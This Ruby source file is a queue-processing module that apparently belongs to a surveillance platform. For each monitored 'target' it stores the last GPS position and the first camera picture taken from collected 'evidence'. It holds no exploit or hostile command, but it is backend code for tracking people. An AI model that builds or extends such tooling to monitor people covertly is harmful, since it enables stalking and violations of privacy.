#
# Intelligence processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module Intelligence

class Processor
  extend RCS::Tracer

  def self.run
    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (entry = IntelligenceQueue.where(flag: NotificationQueue::QUEUED).find_and_modify({"$set" => {flag: NotificationQueue::PROCESSED}}, new: false))
        count = IntelligenceQueue.where({flag: NotificationQueue::QUEUED}).count()
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
    entity = Entity.any_in({path: [Moped::BSON::ObjectId.from_string(entry['target_id'])]}).first

    trace :info, "Processing #{ev.type} for entity #{entity.name}"

    # save the last position of the entity
    save_last_position(ev, entity) if ev.type.eql? 'position'

    # save picture of the target
    save_first_camera(ev, entity) if ev.type.eql? 'camera'

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end


  def self.save_last_position(evidence, entity)
    return if evidence[:data]['latitude'].nil? or evidence[:data]['longitude'].nil?

    entity.last_position = {latitude: evidence[:data]['latitude'].to_f,
                            longitude: evidence[:data]['longitude'].to_f,
                            time: evidence[:da],
                            accuracy: evidence[:data]['accuracy'].to_i}
    entity.save

    trace :info, "Saving last position for #{entity.name}: #{entity.last_position.inspect}"
  end


  def self.save_first_camera(evidence, entity)
    return unless entity.photos.empty?

    file = RCS::DB::GridFS.get(evidence.data['_grid'], entity.path.last.to_s)
    entity.add_photo(file.read)

    trace :info, "Saving first camera picture for #{entity.name}"
  end


end

end #OCR::
end #RCS::